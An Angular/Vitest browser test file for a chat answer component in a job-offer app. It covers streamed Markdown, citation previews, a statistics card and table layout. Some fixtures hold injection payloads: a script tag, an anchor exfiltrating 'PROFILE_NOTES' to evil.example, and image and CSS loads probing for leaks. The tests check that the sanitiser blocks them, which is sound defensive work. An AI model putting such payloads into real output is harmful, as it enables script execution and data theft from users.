import {Component, computed, inject} from '@angular/core';
import {ComponentFixture, TestBed} from '@angular/core/testing';
import {provideRouter, Router} from '@angular/router';
import {Dispatcher} from '@ngrx/signals/events';
import {of} from 'rxjs';
import {userEvent} from 'vitest/browser';
import {ChatApi} from '@core/api/chat.api';
import {replayTurn} from '@core/api/chat-stub';
import {ChatEvent, ChatSource, ChatStatisticsSource, ConversationView} from '@core/model/chat';
import {chatEvents} from '@core/store/chat.events';
import {ChatStore} from '@core/store/chat.store';
import {ChatAnswer} from './chat-answer';

const OFFER_12: ChatSource = {n: 1, kind: 'OFFER', id: 12, title: 'Senior Backend Engineer (Spring Boot, Kotlin)', source: 'Mailing list', date: '2026-08-04', archived: false};
const CONVERSATION: ConversationView = {id: 5, title: 'Remote Spring offers', pinnedOfferId: null, turns: [], updatedAt: '2026-09-27T08:00:00Z'};

/** A turn whose Markdown arrives in pieces, with a script smuggled into the middle of it. */
const STREAM: readonly ChatEvent[] = [
    {event: 'turn', data: {turnId: 41}},
    {event: 'step', data: {ordinal: 1, tool: 'search_offers', label: 'Searched offers', state: 'RUNNING', count: null, durationMs: null}},
    {event: 'step', data: {ordinal: 1, tool: 'search_offers', label: 'Searched offers', state: 'DONE', count: 5, durationMs: 600}},
    {event: 'text', data: {delta: '**Two** fit. The Kotlin role '}},
    {event: 'text', data: {delta: '[1](cite:offer/12) is one; '}},
    {event: 'text', data: {delta: '<script>window.__chatXss = 1</script>'}},
    {event: 'text', data: {delta: 'one id came back from no search: ⟨unverified:4471⟩.\n\n- remote\n- Kotlin'}},
    {event: 'sources', data: {sources: [OFFER_12]}},
    {event: 'done', data: {state: 'DONE'}},
];

@Component({
    selector: 'lg-live-answer-host',
    imports: [ChatAnswer],
    template: `
      @if (turn(); as t) {
        <lg-chat-answer [answer]="t.answer" [steps]="t.steps" [sources]="t.sources" [state]="t.state" [turnId]="t.turnId" [last]="true"/>
      }
    `,
})
class LiveAnswerHost {
    private readonly store = inject(ChatStore);
    readonly turn = computed(() => this.store.liveTurn());
}

@Component({template: ''})
class Blank {}

/**
 * The answer in a real browser: the stream rendering chunk by chunk with its Markdown and without
 * the script it carried (ISC-435), and the citation preview on hover and focus (ISC-442) — a
 * popover, a pointer and a focus ring, none of which jsdom has.
 */
describe('the chat answer in a browser', () => {
    let fixture: ComponentFixture<LiveAnswerHost>;
    let router: Router;

    beforeEach(async () => {
        TestBed.configureTestingModule({
            providers: [
                provideRouter([
                    {path: 'dashboard', component: Blank},
                    {path: 'shortlist/:id', component: Blank},
                ]),
                {
                    provide: ChatApi,
                    useValue: {ask: () => replayTurn(STREAM, 30), capability: () => of({present: true}), get: () => of(CONVERSATION)},
                },
            ],
        });
        router = TestBed.inject(Router);
        await router.navigateByUrl(`/dashboard?chat=${CONVERSATION.id}`);
        const store = TestBed.inject(ChatStore);
        TestBed.inject(Dispatcher).dispatch(chatEvents.conversationLoaded(CONVERSATION));
        expect(store.conversation()?.id).toBe(CONVERSATION.id);
        fixture = TestBed.createComponent(LiveAnswerHost);
        document.body.appendChild(fixture.nativeElement);
        fixture.detectChanges();
    });

    afterEach(() => {
        (fixture.nativeElement as HTMLElement).remove();
        document.documentElement.removeAttribute('data-theme');
    });

    const root = () => fixture.nativeElement as HTMLElement;
    const tick = async (ms: number) => {
        await new Promise((resolve) => setTimeout(resolve, ms));
        fixture.detectChanges();
        await fixture.whenStable();
    };

    async function streamToEnd(): Promise<string[]> {
        TestBed.inject(Dispatcher).dispatch(chatEvents.asked('Which fit?'));
        const seen: string[] = [];
        for (let i = 0; i < 60 && TestBed.inject(ChatStore).streaming() !== false; i++) {
            await tick(10);
            const text = root().querySelector('.lg-chat-md')?.textContent ?? '';
            if (text !== '' && text !== seen.at(-1)) seen.push(text);
        }
        await tick(20);
        return seen;
    }

    for (const theme of ['lg-light', 'lg-dark']) {
        it(`${theme}: renders the stream chunk by chunk, as Markdown, and runs no script (ISC-435)`, async () => {
            document.documentElement.setAttribute('data-theme', theme);
            const seen = await streamToEnd();
            expect(seen.length).toBeGreaterThanOrEqual(3);
            const md = root().querySelector('.lg-chat-md') as HTMLElement;
            expect(md.querySelector('strong')?.textContent).toBe('Two');
            expect(md.querySelectorAll('li')).toHaveLength(2);
            expect(document.querySelector('lg-live-answer-host script')).toBeNull();
            expect((window as {__chatXss?: number}).__chatXss).toBeUndefined();
            // The pill is painted in its tokens, not in a literal.
            const pill = md.querySelector('a.lg-chat-cite') as HTMLElement;
            expect(getComputedStyle(pill).backgroundColor).not.toBe('rgba(0, 0, 0, 0)');
            expect(root().querySelectorAll('.lg-chat-source')).toHaveLength(1);
        });
    }

    // Fix 3F-1: an HTML block left a quote open and swallowed the pill's attributes into the attacker's anchor.
    it('keeps no external link when raw HTML in the stream leaves an attribute quote open (fix 3F-1)', async () => {
        vi.spyOn(TestBed.inject(ChatApi), 'ask').mockReturnValue(
            replayTurn(
                [
                    {event: 'turn', data: {turnId: 41}},
                    {event: 'text', data: {delta: '<div>\n<a href="https://evil.example/?d=PROFILE_NOTES" title="\n\n'}},
                    {event: 'text', data: {delta: 'See [the full posting](cite:offer/12) and ⟨unverified:77⟩ for details.'}},
                    {event: 'sources', data: {sources: [OFFER_12]}},
                    {event: 'done', data: {state: 'DONE'}},
                ],
                10,
            ),
        );
        await streamToEnd();
        const md = root().querySelector('.lg-chat-md') as HTMLElement;
        expect([...md.querySelectorAll('[href]')].map((e) => `${e.tagName}:${e.getAttribute('href')}`)).toEqual(['A:/shortlist/12?chat=5']);
        const attributes = [...md.querySelectorAll('*')].flatMap((e) => [...e.attributes].map((a) => a.value)).join(' ');
        expect(attributes).not.toContain('evil.example');
        expect(md.querySelector('.lg-chat-unverified')?.closest('a')).toBeNull();
        // Clicking the one anchor follows the pill, in-app.
        (md.querySelector('a') as HTMLAnchorElement).click();
        await tick(0);
        expect(router.url).toBe('/shortlist/12?chat=5');
    });

    it('loads nothing a streamed answer names: no image element, no request (exfiltration)', async () => {
        // Same-origin probes, so a load would show in resource timing even as a 404.
        const probe = `leak-probe-${Date.now()}`;
        vi.spyOn(TestBed.inject(ChatApi), 'ask').mockReturnValue(
            replayTurn(
                [
                    {event: 'turn', data: {turnId: 42}},
                    {event: 'text', data: {delta: `Notes: ![x](/${probe}-md.png?d=rate-95) and `}},
                    {event: 'text', data: {delta: `<img src="/${probe}-raw.png?d=cover"><picture><source srcset="/${probe}-set.png"></picture> `}},
                    {event: 'text', data: {delta: `<span style="background-image:url(/${probe}-css.png)">x</span> ⟨unverified:4471⟩`}},
                    {event: 'done', data: {state: 'DONE'}},
                ],
                10,
            ),
        );
        await streamToEnd();
        await tick(100);

        const md = root().querySelector('.lg-chat-md') as HTMLElement;
        expect(md.querySelectorAll('img, picture, source, [style]')).toHaveLength(0);
        expect(md.querySelector('.lg-chat-unverified svg')).not.toBeNull();
        // The control proves resource timing sees such a load at all, so an empty list means something.
        const control = new Image();
        await new Promise((resolve) => {
            control.onload = control.onerror = resolve;
            control.src = `/${probe}-control.png`;
        });
        const fetched = performance.getEntriesByType('resource').map((entry) => entry.name).filter((name) => name.includes(probe));
        expect(fetched.filter((name) => name.includes('-control'))).toHaveLength(1);
        expect(fetched.filter((name) => !name.includes('-control'))).toEqual([]);
    });

    it('shows the caret only while the turn streams, and holds it still under reduced motion', async () => {
        TestBed.inject(Dispatcher).dispatch(chatEvents.asked('Which fit?'));
        let caretSeen = false;
        for (let i = 0; i < 60 && TestBed.inject(ChatStore).streaming(); i++) {
            await tick(10);
            const md = root().querySelector('.lg-chat-md');
            const last = md?.lastElementChild;
            if (last !== null && last !== undefined && getComputedStyle(last, '::after').content !== 'none') caretSeen = true;
        }
        await tick(20);
        expect(caretSeen).toBe(true);
        expect(root().querySelector('.lg-chat-md-streaming')).toBeNull();
    });

    describe('the citation preview (ISC-442)', () => {
        const card = () => document.querySelector('.lg-chat-cite-card') as HTMLElement;
        const open = () => card().matches(':popover-open');

        it('shows the cited row on hover and on focus without navigating, and goes on leave and on Escape', async () => {
            await streamToEnd();
            const url = router.url;
            const pill = root().querySelector('a.lg-chat-cite') as HTMLElement;

            await userEvent.hover(pill);
            await tick(0);
            expect(open()).toBe(true);
            expect(card().textContent).toContain('Senior Backend Engineer (Spring Boot, Kotlin)');
            expect(card().textContent).toContain('Mailing list');
            expect(card().textContent).toContain('2026');
            expect(pill.getAttribute('aria-describedby')).toBe(card().id);
            expect(router.url).toBe(url);

            await userEvent.unhover(pill);
            await tick(0);
            expect(open()).toBe(false);

            pill.focus();
            await tick(0);
            expect(open()).toBe(true);
            await userEvent.keyboard('{Escape}');
            await tick(0);
            expect(open()).toBe(false);
            expect(router.url).toBe(url);
        });

        it('says why an unverified id is not a link, on hover and on focus', async () => {
            await streamToEnd();
            const mark = root().querySelector('.lg-chat-unverified') as HTMLElement;
            expect(mark.closest('a')).toBeNull();

            await userEvent.hover(mark);
            await tick(0);
            expect(open()).toBe(true);
            expect(card().textContent).toContain('4471');
            expect(card().textContent).toContain('not a link');

            await userEvent.unhover(mark);
            await tick(0);
            expect(open()).toBe(false);

            mark.focus();
            await tick(0);
            expect(open()).toBe(true);
            await userEvent.keyboard('{Escape}');
            await tick(0);
            expect(open()).toBe(false);
        });
    });
});

/** A `statistics` source: its numbers come from the tool's result, never from the answer's text. */
const STATISTICS: ChatStatisticsSource = {
    kind: 'STATISTICS',
    ordinal: 1,
    from: '2026-09-01',
    to: '2026-09-30',
    compareFrom: '2026-08-01',
    compareTo: '2026-08-31',
    rows: [
        {label: 'Offers received in the window, all portals together', value: 42, compareValue: 30, delta: 12},
        {label: 'Shortlisted after the hard filter and the scorer', value: 7, compareValue: 9, delta: -2},
        {label: 'Applications open', value: 3, compareValue: null, delta: null},
    ],
    series: [
        {day: '2026-09-01', count: 1},
        {day: '2026-09-02', count: 4},
        {day: '2026-09-03', count: 2},
        {day: '2026-09-04', count: 6},
        {day: '2026-09-05', count: 3},
    ],
};

@Component({
    selector: 'lg-phone-column',
    imports: [ChatAnswer],
    // The answer column of the 390 sheet: 390 less the 15px gutter on each side.
    template: `
      <div style="width: 360px">
        <lg-chat-answer answer="Intake was 99, and 1 made the shortlist." [sources]="sources" state="DONE" [turnId]="41" [last]="true"/>
      </div>
    `,
})
class PhoneColumn {
    readonly sources = [OFFER_12, STATISTICS];
}

/**
 * The statistics card (ISC-460): a stubbed turn whose `STATISTICS` source carries rows and a series
 * while its text states other digits. The card shows the source's numbers, draws the series, links
 * the window to `/analytics`, and at the 390 column only its own wrapper scrolls sideways.
 */
describe('the statistics card in a browser (ISC-460)', () => {
    let fixture: ComponentFixture<PhoneColumn>;

    beforeEach(async () => {
        TestBed.configureTestingModule({
            providers: [provideRouter([{path: 'dashboard', component: Blank}, {path: 'analytics', component: Blank}])],
        });
        await TestBed.inject(Router).navigateByUrl('/dashboard?chat=5');
        fixture = TestBed.createComponent(PhoneColumn);
        document.body.appendChild(fixture.nativeElement);
        fixture.detectChanges();
        await fixture.whenStable();
    });

    afterEach(() => (fixture.nativeElement as HTMLElement).remove());

    const card = () => (fixture.nativeElement as HTMLElement).querySelector('lg-chat-statistics-card') as HTMLElement;

    it('shows the numbers of the source, not the digits of the text', () => {
        const cells = [...card().querySelectorAll('tbody tr')].map((row) => [...row.querySelectorAll('th, td')].map((c) => c.textContent?.trim()));
        expect(cells[0].slice(1)).toEqual(['42', '30', expect.stringContaining('+12')]);
        expect(cells[1].slice(1)).toEqual(['7', '9', expect.stringContaining('−2')]);
        expect(cells[2][1]).toBe('3');
        expect(card().textContent).not.toContain('99');
        // The offer is still a source card; the statistics are not one of them.
        expect((fixture.nativeElement as HTMLElement).querySelectorAll('.lg-chat-source')).toHaveLength(1);
    });

    it('marks a difference with a sign and an arrow in the ink of its row, never a good or bad colour', () => {
        const rows = [...card().querySelectorAll('tbody tr')];
        const up = rows[0].querySelector('.lg-chat-stats-delta') as HTMLElement;
        const down = rows[1].querySelector('.lg-chat-stats-delta') as HTMLElement;
        expect(up.dataset['direction']).toBe('up');
        expect(down.dataset['direction']).toBe('down');
        expect(up.querySelector('lg-icon svg')).not.toBeNull();
        expect(down.querySelector('lg-icon svg')).not.toBeNull();
        const ink = getComputedStyle(rows[0].querySelector('.lg-chat-stats-value') as HTMLElement).color;
        expect(getComputedStyle(up).color).toBe(ink);
        expect(getComputedStyle(down).color).toBe(ink);
    });

    it('draws the series as a sparkline in currentColor, hidden from assistive tech', () => {
        const svg = card().querySelector('svg.lg-chat-stats-spark') as SVGSVGElement;
        expect(svg.getAttribute('aria-hidden')).toBe('true');
        const line = svg.querySelector('polyline') as SVGPolylineElement;
        expect(line.getAttribute('points')?.trim().split(/\s+/)).toHaveLength(STATISTICS.series.length);
        expect(line.getAttribute('stroke')).toBe('currentColor');
    });

    it('links the window it answered to /analytics', () => {
        const link = card().querySelector('a.lg-chat-stats-link') as HTMLAnchorElement;
        const url = new URL(link.href);
        expect(url.pathname).toBe('/analytics');
        expect(url.searchParams.get('from')).toBe('2026-09-01');
        expect(url.searchParams.get('to')).toBe('2026-09-30');
    });

    it('at the 390 column only its own wrapper scrolls sideways', () => {
        const column = (fixture.nativeElement as HTMLElement).firstElementChild as HTMLElement;
        const scroller = card().querySelector('.lg-chat-stats-scroll') as HTMLElement;
        expect(getComputedStyle(scroller).overflowX).toBe('auto');
        expect(card().getBoundingClientRect().width).toBeLessThanOrEqual(360);
        expect(column.scrollWidth).toBeLessThanOrEqual(column.clientWidth);
        expect(document.documentElement.scrollWidth).toBeLessThanOrEqual(document.documentElement.clientWidth);
    });
});

/** The Markdown the model writes, laid out in a real browser, where CSS applies and jsdom has none. */
describe('the answer Markdown in a browser', () => {
    beforeEach(() => TestBed.configureTestingModule({providers: [provideRouter([])]}));

    it('keeps a table'+"'"+'s columns apart: an id never runs into the title beside it', async () => {
        // Measured on the demo: "163Java Developer…", the cells at 0px padding.
        const answer = TestBed.createComponent(ChatAnswer);
        answer.componentRef.setInput('answer', '| id | title |\n|----|-------|\n| 163 | Java Developer |');
        answer.componentRef.setInput('state', 'DONE');
        document.body.appendChild(answer.nativeElement);
        answer.detectChanges();
        await answer.whenStable();
        const [id, title] = [...(answer.nativeElement as HTMLElement).querySelectorAll('td')];
        expect(id).toBeDefined();
        expect(title.getBoundingClientRect().left - id.getBoundingClientRect().right).toBeGreaterThanOrEqual(0);
        const text = document.createRange();
        text.selectNodeContents(title);
        expect(text.getBoundingClientRect().left - id.getBoundingClientRect().left).toBeGreaterThan(id.textContent!.trim().length * 6);
        expect(parseFloat(getComputedStyle(id).paddingInlineEnd)).toBeGreaterThan(0);
        (answer.nativeElement as HTMLElement).remove();
    });

    it('never breaks a short id inside its cell when a long title squeezes the table', async () => {
        // Measured on the demo: "163" drawn as "16" over "3" beside a long title, because the answer's
        // overflow-wrap: anywhere let the table shrink the id column below the width of its number.
        const answer = TestBed.createComponent(ChatAnswer);
        answer.componentRef.setInput('answer', '| ID | Title |\n|----|-------|\n| 163 | Java Developer Spring Boot Automotive – Microservices and a lot more words |');
        answer.componentRef.setInput('state', 'DONE');
        (answer.nativeElement as HTMLElement).style.cssText = 'display: block; width: 260px';
        document.body.appendChild(answer.nativeElement);
        answer.detectChanges();
        await answer.whenStable();
        const id = (answer.nativeElement as HTMLElement).querySelector('td')!;
        const text = document.createRange();
        text.selectNodeContents(id);
        expect(text.getClientRects().length, 'the id on one line').toBe(1);
        (answer.nativeElement as HTMLElement).remove();
    });
});
